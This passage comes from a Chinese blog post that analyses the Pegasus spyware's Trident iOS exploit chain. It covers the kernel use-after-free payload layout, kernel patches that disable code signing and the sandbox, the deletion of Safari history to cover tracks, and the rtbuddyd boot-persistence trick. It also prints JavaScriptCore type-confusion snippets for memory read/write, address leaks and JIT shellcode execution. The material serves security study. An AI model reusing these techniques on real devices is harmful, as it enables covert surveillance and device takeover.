[0x28] kOSSerializeEndCollecton | kOSSerializeObject | 1 </code></pre>
<p>虽然在结构上它们看起来有些不同，但最终它们都利用了UAF漏洞。在iOS 9.3.2及更高版本中使用的这种更简单的payload是最容易理解的。当OSUnserializeBinary开始反序列化payload的解析过程时，该函数将创建一个新的字典对象，偏移0x04处的运行结果。在词典中有两个无键对象。第一个对象是一个<strong>OSString</strong>对象，其值为<strong>sy2</strong>（分别在偏移量0x08和0x0C中指定）。在偏移量0x10处指定大小为0x14（20）字节的<strong>OSData</strong>对象。OSData对象包含payload缓冲区数据结构。由于对象是无键的，OSUnserializeBinary将用OSData对象替换OSString对象，但将指针留在objsArray中。由于OSString对象没有retain（）调用，OSString被释放，从而将两个内存数组放入空闲列表中（一个用于OSString对象本身，另一个用于与OSString对象关联的字符串）。</p>
<p>当OSUnserializeBinary解析kOSSerializeData时，将分配新的OSData对象，从而从空闲列表中消耗一个已释放的内存位置。当与kOSSerializeData关联的数据被复制到OSData对象中时，将为数据分配新的缓冲区，该缓冲区将消耗空闲列表中的剩余数据位置。此时，objsArray中的悬空指针已被OSData对象的数据替换。它是与OSData对象关联的数据，其中包含恶意payload，最终将给予32Stage2写访问内核权限，以便安装读/写原语。</p>
<p>无论iOS版本如何，恶意payload都包含相同的payload缓冲区。payload缓冲区是一个20字节的结构，由以下元素组成：</p>
<pre><code>[00] address of uaf_payload_buffer + 8
[04] &#123;uninitialized data from stack&#125;
[08] address of uaf_payload_buffer
[0C] static value of 20
[10] address of OSSerializer::serialize</code></pre>
<p>payload必须包含指向偏移量0x10处新保留函数的指针。32Stage2使用OSSerializer :: serialize函数作为替换保留。这种设计意味着payload的其余部分必须模拟OSSerializer对象的vtable。如先前在已植入的设备上建立读/写/执行原语所述，OSSerializer :: serialize函数将在所提供的vtable的偏移0x10处调用该函数，同时将vtable的偏移0x08和0x0C传递给被调用的函数。假设偏移量0x10设置为OSSerializer :: serialize，则会再次调用该函数，但第二次将调用偏移量0x08指定的vtable。此调用会导致一系列后续调用，最终导致调用 <strong>_copyin</strong>，这个函数替换实时和电池时钟的getattr处理程序，正如在之前植入的设备上建立读/写/执行原语步骤中所述。</p>
<p>在执行漏洞利用之后，如果受害者的手机是“iPhone4,1”，则控制之前生成的1000个线程的全局变量值将设置为-1以终止线程。</p>
<p>为验证电池时钟的getattr处理程序是否成功读取内核内存地址，将调用<em>clock_get _attributes</em>，并将读取位置指定为内核的基址。如果<em>clock_get _attributes</em>的结果不是魔术值<code>0xFEEDFACE</code>，则再次尝试。 第二次失败导致调用assert回调并终止32Stage2。</p>
<h4 id="建立内核读-写基元（64位）"><a href="#建立内核读-写基元（64位）" class="headerlink" title="建立内核读/写基元（64位）"></a>建立内核读/写基元（64位）</h4><p>在第二阶段的64位版本中利用了相同的底层漏洞。原则上，漏洞利用的结构非常类似。主要区别在于通过写入<strong>net.inet.ip.dummynet.extract _ heap</strong> sysctl处理程序来建立最终的执行原语。OSSerializer :: serialize的使用方式与32Stage2中的类似。然后使用在建立内核执行原语（32位）中描述的相同机制来实现任意代码执行（通过执行任意ROP链）。</p>
<h4 id="建立内核执行原语（32位）"><a href="#建立内核执行原语（32位）" class="headerlink" title="建立内核执行原语（32位）"></a>建立内核执行原语（32位）</h4><p>正如之前在Rooted Devices上安装内核访问处理程序中所解释的那样，实时时钟的getattr处理程序指向OSSerializer :: serialize，它允许clock_get_attributes的调用者将特制结构传递给OSSerializer :: serialize以便在内核空间中执行指令。要在内核空间内执行，用户区32Stage2进程必须具有以可靠的方式将数据传输到内核地址空间的方法。 32Stage2使用管道创建的管道集的方法来完成此任务。</p>
<p>在将电池时钟的新getattr处理程序建立为* _bufattr _cpx* 之后，32Stage2有一个可靠的方法将DWORD从内核地址空间读入用户空间。32Stage2使用此功能来查找存储在内核中的<strong>addrperm</strong>值。addrperm重新定义数据传入用户区时在内核中的偏移量，以便混淆内核中数据的真实位置。如果获得该值，可以将内核地址反混淆到其真实地址值。32Stage2从生成的管道集中调用读取管道的<strong>fstat</strong>，然后计算<strong>stat</strong>结构的位置与内核地址空间之间的差异。然后将该值存储在全局变量中，供必须访问内核内存以执行代码的函数使用。</p>
<p>每当32Stage2想要在内核中执行代码时，以下数据结构将写入生成的管道集中write pipe：</p>
<pre><code>[00] argument 1
[04] argument 2
[08] address of cpde execute</code></pre>
<p>为了调用数据偏移量8中指定的函数，另一个DWORD被预先添加到数据中并传递给实时时钟的getattr处理程序（通过OSSerializer :: serialize访问），它在调用要执行的函数地址之前将参数1放入R3和参数2放入R1。通过将未使用的DWORD添加到数据结构中，该数据块成为OSSerializer的vtable替代品。该技术用于32Stage2中的两个不同函数。 一个函数允许任意内核函数调用，另一个函数用于将DWORD值写入内核地址空间。</p>
<h4 id="修补内核以允许内核端口访问"><a href="#修补内核以允许内核端口访问" class="headerlink" title="修补内核以允许内核端口访问"></a>修补内核以允许内核端口访问</h4><p>由于能够在内核地址空间内读取，写入和执行任意位置，下一步是通过内核端口获得对内核的更直接访问。如果使用PID值0调用，则 **  _for_pid ** 会返回错误。为了绕过这种保护，第2阶段修改了<strong>task_for_pid</strong>中的四个不同位置。在开始修改<strong>task_for_pid</strong>之前，阶段2确定需要修该改的区域是否在可读取/执行的内存区域内。如果内存不可写，则第2阶段将直接修改内存区域的权限以允许写访问，然后使dcache无效并刷新数据和TLBs指令以确保内存区域进行权限更新。</p>
<p>修改<strong>task_for_pid</strong>以允许调用者获得内核的端口后， 在调用assert回调和退出之前，第2阶段将尝试通过调用<strong>task_for_pid（mach_task_self，0，＆port）</strong>来获取五次内核端口，每次尝试之间有100次毫秒延迟。</p>
<h2 id="阶段三：提权和实现越狱"><a href="#阶段三：提权和实现越狱" class="headerlink" title="阶段三：提权和实现越狱"></a>阶段三：提权和实现越狱</h2><p>本节介绍在第2阶段执行的最终步骤，以获取iPhone上的root访问权限，禁用代码签名，然后实现越狱。 此阶段利用最终的Trident漏洞，该漏洞会造成内核内存损坏导致越狱（CVE-2016-4656）。</p>
<h3 id="修改系统以提权"><a href="#修改系统以提权" class="headerlink" title="修改系统以提权"></a>修改系统以提权</h3><p>32Stage2的下一步是在受害者的手机上获得root访问权限。如果第2阶段进程没有以root用户身份运行（UID = 0），在非越狱手机上不可能以root运行，第2阶段会修补setreuid功能跳过对提权的检查。若对setreuid的修改完成，该函数最多被调用五次（每次调用之间有500ms的延迟），直到setreuid（0,0）返回成功。在五次尝试之后（或在成功的setreuid调用之后），修改后的setreuid会给出相反的结果。最后检查进程的用户值（UID）以确保它确实是root（0）。 如果函数getuid返回0以外的任何值，则调用assert并退出阶段2。</p>
<p>阶段2通过实时时钟<strong>clock_get_attributes</strong>调用内核函数<strong>kauth_cred_get_with_ref</strong>，以便接收主线程的凭证。在此之后，第2阶段将找到mac_policy_list，其中包含当前加载到iOS内核中的访问控制策略模块列表。阶段2检查列表，查找以名称“Seat”开头的模块，可参考“Seatbelt沙箱策略”。如果未找到策略模块，则阶段2调用断言回调并终止。但是，如果找到该模块，则会读取并修改<strong>mpc_field_off</strong>，以允许当前进程更大程度地控制受害者的iPhone。</p>
<p>因为可访问内核端口并且删除了将阻止第2阶段执行通常被沙箱策略阻止的权限操作的限制，阶段2不再需要实时时钟的getattr处理程序。为了确保将来对此处理程序的调用不会使手机崩溃，将修改getattr函数指针以指向指令：<br><code>BX LR</code><br>这个新的处理函数有效地将未来对实时时钟的getattr调用转换为NOP。这可能是为了确保将来调用getattr处理程序（通过某些其他进程）不会产生意外后果并导致内核崩溃。</p>
<h3 id="禁用代码签名"><a href="#禁用代码签名" class="headerlink" title="禁用代码签名"></a>禁用代码签名</h3><p>默认情况下，标准iPhone上的iOS将阻止未签名的代码通过正常方式运行，例如<code>execv</code>或系统调用。同样，通过将文件系统设置为只读，可以防止对根文件系统的修改。这些情况将阻止第2阶段执行越狱程序，并将阻止越狱程序（如果它激活）修改系统。第2阶段修改了几个内核函数和两个内核扩展（kext），以允许这些禁止的操作。第2阶段首先找到<code>com.apple.driver.AppleMobileFileIntegrity</code>和<code>com.apple.driver.LightweightVolumeManager</code>的kext。<code>com.apple.driver.AppleMobileFileIntegrity</code>（AMFI）扩展程序负责实施iOS的代码签名功能。<code>com.apple.driver.LightweightVolumeManager</code>扩展负责主存储设备的分区表。阶段2通过调用OSKextCopyLoadedKextInfo来定位每个扩展，该函数返回含有扩展信息的字典对象。在字典中的是当扩展被调用时的加载偏移量，阶段二通过添加一已知的偏移量将其放入内核地址中。</p>
<p>使用AMFI的内核地址，阶段2定位以下全局变量：<br><code>amfi_get_out_of_my_way</code><br><code>cs_enforcement_disable</code><br>这两个变量在设置好后会禁用AFMI并禁用代码签名。然后，阶段2设置另外两个全局变量：debug _ flags和DEBUGflag。 这两个变量允许对受害者的iPhone进行调试权限，进一步减少沙箱（SEATBELT）对设备施加的限制。</p>
<p>接下来，第2阶段修改内核函数<code>vm_map_enter</code>和<code>vm_map_protect</code>，以便在虚拟内存管理器中禁用代码签名验证（可以分配RWX区域）。在此之后，第2阶段修改LightweightVolumeManager中的<code>_mapForIO</code>函数，然后修改内核函数csops以禁用更多的代码签名保护。</p>
<h3 id="重新安装驱动器"><a href="#重新安装驱动器" class="headerlink" title="重新安装驱动器"></a>重新安装驱动器</h3><p>为了越狱设备，必须拥有根文件系统写权限。阶段2通过对<code>/ sbin / launchd</code>调用访问函数来测试根文件系统的可写性，以确定阶段2是否具有对根文件系统的写访问权。如果文件是只读的，则第2阶段修补内核函数<code>_ mac _ mount</code>以禁用保护策略，该策略阻止将文件系统重新安装为读/写，然后通过调用<code>mount(“hfs”, “/”, MNT _ UPDATE ,mountData)</code>将root文件系统重新安装为读/写，其中mountData指定<code>/ dev / disk0s1s1</code>设备。</p>
<p>如此编写使得它只能在iOS 9系列iPhone上运行，但代码存在表明它曾经在较旧的iOS版本上使用过。作为支持此声明的证据，在第2阶段重新安装根文件系统后会调用一个函数，如果它在iOS 7，iOS 8或iOS 9上运行，则修改其执行路径。根据iOS版本，函数在<code>/ bin / launchctl</code>（适用于iOS 7和8）或<code>/ bin / launchd</code>（适用于iOS 9）上调用<code>fsctl</code>。<code>fsctl</code>将修改低磁盘空间警告阈值以及极低磁盘空间警告阈值，分别将值设置为8192和8208。</p>
<h3 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h3><p>由于Safari中允许任意代码执行的漏洞，第2阶段被激活。作为第2阶段在实现越狱之前执行的最后一项活动之一，第2阶段尝试通过清理Safari中的历史记录和缓存文件来覆盖其感染向量。清除Safari浏览器历史记录和缓存文件的过程非常简单，并且特定于iOS版本。</p>
<p>对于iOS 8和iOS 9（如果未在iOS 9上运行，第2阶段将在开始时终止），将从受害者的iPhone中立即删除以下文件以删除浏览器和缓存信息：</p>
<pre><code>• /Library/Safari/SuspendState.plist
• /Library/Safari/History.db
• /Library/Safari/History.db-shm
• /Library/Safari/History.db-wal
• /Library/Safari/History.db-journal
• /Library/Caches/com.apple.mobilesafari/Cache.db
• /Library/Caches/com.apple.mobilesafari/Cache.db-shm
• /Library/Caches/com.apple.mobilesafari/Cache.db-wal
• /Library/Caches/com.apple.mobilesafari/Cache.db-journal
• (files in the directory) /Library/Caches/com.apple.mobilesafari/fsCachedData/</code></pre>
<p>对于iOS 7，将删除以下文件：</p>
<pre><code>• /Library/Caches/com.apple.mobilesafari/Cache.db
• /Library/Caches/com.apple.mobilesafari/Cache.db-shm
• /Library/Caches/com.apple.mobilesafari/Cache.db-wal
• /Library/Caches/com.apple.mobilesafari/Cache.db-journal</code></pre>
<p>最后调用<code>sync</code>，以确保将删除写入磁盘。</p>
<h3 id="下一阶段安装"><a href="#下一阶段安装" class="headerlink" title="下一阶段安装"></a>下一阶段安装</h3><p>再次给出使用最初针对较旧的iOS版本的代码的证据，主线程调用的下一个函数进行解压缩并将两个文件放到受害者的文件系统上。以下代码段说明了Stage 2如何确定越狱二进制文件在受害者设备上的位置：</p>
<pre><code>if ( ( unsigned int) ( majorVersion -8 ))
&#123;
    if ( majorVersion ==7 )&#123;
        pszJBFilenamePath = &quot;/bin/sh&quot;;
        if( flag )
            pszJBFilenamepath = &quot;/private/var/tmp/jb-install&quot;;
    &#125;
    else&#123;
        assert();
        writeLog(3, &quot;%.2s%5.5d\n&quot;, &quot;bh.c&quot;, 134);
        exit(-1);
        pszJBFilenamePath =0;
    &#125;
&#125;
else
&#123;
    pszJBFilenamePath = &quot;/sbin/mount_nfs.temp&quot;;
&#125;</code></pre>
<p>代码片段显示，对于iOS版本7，下一阶段二进制文件的安装路径是<code>/ bin / sh</code>或<code>/ private / var / tmp / jb-install</code>（如果flag为非零）。对于早于7的iOS版本，将调用断言回调并终止程序。 对于iOS 8及更高版本，安装路径指定为<code>/ sbin / mount _ nfs.temp</code>。</p>
<p>包含下一阶段二进制的数据blob的大小被验证为非零。如果大小为零，则发生断言回调并终止第2阶段。然后，阶段2使用<code>BZ2 _ *</code> API函数将数据解压缩为两个文件：第一个文件是下一个阶段的二进制文件，对于iOS 9，它存储在<code>/ sbin / mount _ nfs.temp</code>中。 第二个文件是配置文件，存储在<code>/ private / var / tmp / jb _ cfg</code>中。</p>
<p>在控制返回主线程之前，这两个文件的权限更改为<code>0755</code>（使文件可执行）。</p>
<p>Stage 2在终止之前调用的最终函数负责移动上一步骤中放下的二进制文件。对于iOS版本8和9，文件<code>/ sbin / mount _ nfs.temp</code>重命名为<code>/ sbin / mount _ nfs</code>。如果受害者手机上的iOS是iOS 9，则会在重命名操作之前尝试删除<code>/ sbin / mount _ nfs</code>。重命名文件后，调用assert回调函数，然后调用exit函数，终止Stage 2。</p>
<p>一旦执行返回主线程，第2阶段将以静默方式终止</p>
<h3 id="现有的越狱检测"><a href="#现有的越狱检测" class="headerlink" title="现有的越狱检测"></a>现有的越狱检测</h3><p>如前所述，Stage 2二进制文件以两种不同的模式运行。第一个已经讨论过，其构成了一个完整的iOS漏洞利用和越狱。 第二个是在已经越狱的系统上运行Stage 2二进制文件时所采用策略。在第二模式下，第2阶段只是利用现有的越狱后门来安装Pegasus特定的内核补丁。</p>
<p>为了确定设备是否已经越狱，第2阶段尝试利用常见的越狱后门获取进入iOS内核的有效机器端口。只需通过调用<code>task _ for _ pid</code>并将PID值设置为0来执行此检查。 修改<code>task _ for _ pid</code>是iOS越狱使用的常见后门机制，它使用户模式进程有直接内核内存访问的权力。iOS通常不允许使用PID为0的<code>task _ for _ pid</code>。如果<code>task _ for _ pid</code>返回有效的任务端口，Stage 2进程就可以提升对内核的访问权限，那么就可以放弃前面描述的权限提升步骤。</p>
<p>阶段2还检查<code>/ bin / sh</code>在不在。在未越狱手机上，这个二进制文件永远不应该存在。当阶段2检测到此二进制文件的存在时，它假定现有的越狱程序与Pegasus不兼容或者所有必需的内核补丁已经到位并且不需要进一步的操作。当在设备上存在<code>/ bin / sh</code>时，阶段2不用进行攻击直接退出即可。</p>
<h2 id="四：Pegasus持久性机制"><a href="#四：Pegasus持久性机制" class="headerlink" title="四：Pegasus持久性机制"></a>四：Pegasus持久性机制</h2><p>本节详细介绍了Pegasus通过Trident漏洞进行攻击后保留在设备上的持久性机制，并在每次设备重新启动时继续执行未签名的代码。</p>
<h3 id="Pegasus持久性机制"><a href="#Pegasus持久性机制" class="headerlink" title="Pegasus持久性机制"></a>Pegasus持久性机制</h3><p>Pegasus使用的持久性机制在每次设备启动时可靠地执行未签名的代码（并最终执行内核漏洞以再次越狱设备）依赖于两个不同问题的组合。</p>
<p>第一个问题是<code>plist</code>中存在<code>rtbuddyd</code>服务（在设备启动时启动）。请注意，在iOS 10之前，rtbuddyd存在于某些iPhone设备上，例如iPhone 6S，但不存在于<code>iPhone 6</code>等其他设备上。因此，任何可以复制到指定路径（<code>/ usr / libexec / rtbuddyd</code>）的已签名二进制文件都将在引导时使用plist中指定的参数（特别是“<code>--early-boot</code>”）执行。</p>
<pre><code>&lt;key&gt; rtbuddy&lt;/key&gt;&lt;dict&gt;&lt;key&gt;ProgramArguments&lt;/key&gt;&lt;array&gt;&lt;string&gt;rtbuddy&lt;/string&gt;&lt;string&gt;--early-boot&lt;/string&gt;&lt;/array&gt;&lt;key&gt;PerformInRestore&lt;/key&gt;&lt;true/&gt;&lt;key&gt;RequireSucess&lt;/key&gt;&lt;true/&gt;&lt;key&gt;Program&lt;/key&gt;&lt;string&gt;/usr/libexec/rtbuddy&lt;/string&gt;&lt;/dict&gt;</code></pre>
<p>由于此行为，系统上的任何已签名二进制文件都可以在引导时使用单个参数执行。通过在当前工作目录中创建名为<code>--early-boot</code>的符号链接，可以将任意文件作为第一个参数传递给已复制到<code>rtbuddyd</code>位置的任意已签名二进制文件。</p>
<p>此持久性机制中利用的第二个问题是JavaScriptCore二进制文件中的漏洞。Pegasus利用前面描述的方法，通过将文件复制到<code>/ usr / libexec / rtbuddyd</code>来执行jsc二进制文件（JavaScriptCore）。然后可以通过创建名为<code>--early-boot</code>的符号链接来执行任意JavaScript代码，该符号链接指向要在引导时执行的代码文件。然后Pegasus利用jsc二进制文件中的错误转换来执行未签名的代码并重新利用内核。</p>
<h3 id="JavaScriptCore内存损坏问题"><a href="#JavaScriptCore内存损坏问题" class="headerlink" title="JavaScriptCore内存损坏问题"></a>JavaScriptCore内存损坏问题</h3><p>该问题存在于JavaScript绑定的<code>setImpureGetterDelegate（）</code>中（由<code>functionSetImpureGetterDelegate</code>支持）。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EncodeJSValue JSC_HOST_CALL <span class="title">functionSetImpureGetterDelegate</span><span class="params">(ExecState* exec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">JSLockHolder <span class="title">lock</span><span class="params">(exec)</span></span>;</span><br><span class="line">	JSValue base = exec-&gt;argument(<span class="number">0</span>)；</span><br><span class="line">	<span class="keyword">if</span>(!base.isObject())</span><br><span class="line">		<span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">	JSValue delegate =exec-&gt;argument(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span>(!delegate.isObject())</span><br><span class="line">		<span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">	ImpureGetter* impureGetter = jsCast&lt;ImpureGetter*&gt;(asObject(base.asCell()));</span><br><span class="line">	impureGetter-&gt;setDelegate(exec-&gt;vm(), asObject(delegate.asCell()));</span><br><span class="line">	<span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个绑定有两个参数：第一个是ImpureGetter，第二个是将被设置为ImpureGetter delegate的通用JSObject。这个问题是由于缺乏验证，JSObject作为第一个参数实际上是一个格式正确的ImpureGetter。当另一个对象类型作为第一个参数传递时，对象指针将不正确地向下转换为ImpureGetter指针。</p>
<p>随后，当通过<code>setDelegate（)</code>设置<code>m_delegate</code>时，指向作为第二个参数传递的JSObject的指针将写入与<code>m_delegate</code>对齐的偏移量（16个字节到提供的对象中）。此问题可用于创建一个原语，允许将指向任意JSObject的指针写入16个字节到任何其他JSObject中。</p>
<h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><p>Pegasus利用此问题在iOS应用程序执行时实现未签名代码执行。为了获得对执行流程的控制，该攻击利用了许多<code>DataView</code>对象。使用<code>DataView</code>是因为它们提供了一种简单的机制来读取和写入向量中的任意偏移量。DataView对象在16字节偏移处有一个指向缓冲区的指针。利用这些损坏的DataView对象，漏洞利用程序安装获取任意本机代码执行权所需的工具 - 即读/写原语以及暴露任意JavaScript对象地址。完成此设置后，漏洞利用程序就可以创建包含本机代码payload的可执行映射。 以下部分详细介绍了此过程的各个阶段。</p>
<h4 id="获取任意读-写原语"><a href="#获取任意读-写原语" class="headerlink" title="获取任意读/写原语"></a>获取任意读/写原语</h4><p>可以使用以下代码片段获取用于DataView对象的任意偏移量的读/写原语。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var dummy_ab = <span class="keyword">new</span> ArrayBuffer(<span class="number">0x20</span>);</span><br><span class="line">var dataview_init_rw = <span class="keyword">new</span> DataView(dummy_ab);</span><br><span class="line">...</span><br><span class="line">var dataview_rw = <span class="keyword">new</span> DataView (dummy_ab);</span><br><span class="line">...</span><br><span class="line">setImpureGetterDalagate(dataview_init_rw, dataview_rw);</span><br></pre></td></tr></table></figure>
<p>首先，使用虚拟<code>ArrayBuffer</code>作为两者的后备向量创建两个DataView。接下来，利用指向<code>dataview_rw</code>的指针来利用该问题来破坏<code>dataview_init_rw</code>的<code>m_vector</code>成员。对<code>dataview_init_rw</code> 后续读取和写入，DataView会让dataview_rw的任一成员泄露或重写。接下来，对该对象的控制用于获得整个进程存储器的读/写原语。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var DATAVIEW_ARRAYBUFFER_OFFSET = <span class="number">0x10</span>;</span><br><span class="line">var DATAVIEW_BYTELENGTH_OFFSET = DATAVIEW_ARRAYBUFFER_OFFSET + <span class="number">4</span>;</span><br><span class="line">var DATAVIEW_MODE_OFFSET = DATAVIEW_BYTELENGTH_OFFSET + <span class="number">4</span>;</span><br><span class="line">var FAST_TYPED_ARRAY_MODE = <span class="number">0</span>;</span><br><span class="line">dataview_init_rw.setUnit32(DATAVIEW_ARRAYBUFFER_OFFSET, <span class="number">0</span> , <span class="literal">true</span>);</span><br><span class="line">...</span><br><span class="line">dataview_init_rw.setUnit32(DATAVIEW_BYTELENGTH_OFFSET, <span class="number">0xFFFFFFFF</span> , <span class="literal">true</span>);</span><br><span class="line">...</span><br><span class="line">dataview_init_rw.setUnit8(DATAVIEW_MODE_OFFSET, FAST_TYPED_ARRAY_MODE, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>向dataview_rw DataView中写入三个偏移量。首先，指向后备向量的指针指向零地址。然后将DataView的长度设置为<code>0xFFFFFFFF</code>，有效地设置DataView以映射进程的所有虚拟内存。最后，将模式设置为简单类型（即<code>FastTypedArray</code>），允许在给定虚拟地址的情况下将偏移量计算到DataView中。<code>dataview_rw DataView</code>现在通过它公开的getType和setType方法提供任意读/写原语。</p>
<h4 id="泄漏对象地址"><a href="#泄漏对象地址" class="headerlink" title="泄漏对象地址"></a>泄漏对象地址</h4><p>所需的最后一个原语可以暴露任意JavaScript对象的虚拟内存地址。使用上面利用的相同问题来泄漏单个对象的地址而不是暴露整个存储器空间来实现该原语。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var dummy_ab = <span class="keyword">new</span> ArrayBuffer (<span class="number">0x20</span>);</span><br><span class="line">...</span><br><span class="line">var dataview_leak_addr = <span class="keyword">new</span> DataView ( dummy_ab);</span><br><span class="line">var dataview_dv_leak = <span class="keyword">new</span> DataView (dummy_ab);</span><br><span class="line">setImpureGetterDelegate (dataview_dv_leak, dataview_leak_addr);</span><br><span class="line">...</span><br><span class="line">setImpureGetterDelegate (dataview_leak_addr, object_to_leak );</span><br><span class="line">leaked_addr = dataview_dv_leak.getUnit32(DATAVIEW_ARRAYBUFFER_OFFSET, ture);</span><br></pre></td></tr></table></figure>
<p>同样，使用虚拟ArrayBuffer作为两者的支持向量创建两个DataView。接下来，用指向<code>dataview_leak_addr</code>的指针来利用该问题去破坏<code>dataview_dv_leak</code>的<code>m_vector</code>成员。为泄漏任意JavaScript对象的地址，第二次触发该问题。这次，dataview_leak_addr DataView的m_vector被需泄露的对象的地址代替。最后，可以读取<code>dataview_dv_leak DataView</code>中偏移16个字节的dword以获取目标对象的地址。</p>
<h4 id="未签名的本机代码执行"><a href="#未签名的本机代码执行" class="headerlink" title="未签名的本机代码执行"></a>未签名的本机代码执行</h4><p>如第1阶段Safari漏洞利用中所使用的那样，Pegasus在本攻击中使用相同的机制来获取代码执行权限。该漏洞创建了一个可执行映射，其中包含要执行的shellcode。为了实现这个目的，创建了一个JSFunction对象（含有数百个空的try / catch块，稍后将被覆盖）。为了帮助确保JIT将JavaScript编译为本机代码，随后会重复调用该函数。鉴于JavaScriptCore库的性质，此JIT编译的本机代码将驻留在映射为读/写/执行的内存区域中。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var body =<span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="keyword">for</span> (var k=<span class="number">0</span>; k&lt;<span class="number">0x600</span>; k++)&#123;</span><br><span class="line">	body+= &#x27;try () catch(e) ();&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">var to_overwrite = <span class="keyword">new</span> Function(<span class="string">&#x27;a&#x27;</span>, body);</span><br><span class="line"><span class="keyword">for</span> (var i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">	to_overwrite();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后可以读取此JSFunction对象的地址，并且可以读取各种成员以获取RWX映射的地址。然后用shellcode覆盖JITed try / catch块，并且可以简单地调用<code>to_overwrite（）</code>函数来实现任意代码执行。</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button onclick="document.querySelector('.post-reward').classList.toggle('active');">
    赞赏
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/alipay.JPG" alt="finsenty54 支付宝">
        <span>支付宝</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>finsenty54
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="http://finsenty54.github.io/2019/04/16/pegasus%E5%88%86%E6%9E%90/" title="pegasus分析">http://finsenty54.github.io/2019/04/16/pegasus分析/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="followme">
  <span>欢迎关注我的其它发布渠道</span>

  <div class="social-list">

      <div class="social-item">
        <a target="_blank" class="social-link" href="/atom.xml">
          <span class="icon">
            <i class="fa fa-rss"></i>
          </span>

          <span class="label">RSS</span>
        </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/ios/" rel="tag"># ios</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2019/03/28/penetration-test-report-interpretation/" rel="prev" title="penetration test report interpretation">
                  <i class="fa fa-chevron-left"></i> penetration test report interpretation
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2019/05/17/sql-more-details/" rel="next" title="burpsuite 安全学院笔记">
                  burpsuite 安全学院笔记 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2019 – 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">finsenty54</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">269k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">4:05</span>
  </span>
</div>
<div id="days"></div>
<script>
function show_date_time(){
    window.setTimeout("show_date_time()", 1000);
    BirthDay=new Date("02/26/2019 17:01:08");//修改为自己的blog建站时间
    today=new Date();
    timeold=(today.getTime()-BirthDay.getTime());
    sectimeold=timeold/1000
    secondsold=Math.floor(sectimeold);
    msPerDay=24*60*60*1000
    e_daysold=timeold/msPerDay
    daysold=Math.floor(e_daysold);
    e_hrsold=(e_daysold-daysold)*24;
    hrsold=setzero(Math.floor(e_hrsold));
    e_minsold=(e_hrsold-hrsold)*60;
    minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
